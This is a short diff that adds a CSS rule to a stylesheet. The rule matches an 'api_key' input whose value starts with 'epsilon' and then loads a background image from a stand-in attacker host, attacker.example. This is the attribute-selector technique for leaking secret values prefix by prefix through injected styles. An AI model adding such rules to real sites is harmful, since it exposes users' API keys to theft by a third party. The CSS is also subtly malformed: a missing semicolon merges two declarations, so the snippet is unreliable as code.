@@ -1,0 +1,6 @@
+@media screen {
+  input[name="api_key"][value^="epsilon"] {
+    background-image: url("https://attacker.example/malformed-recovery")
+    color: red
+  }
+}
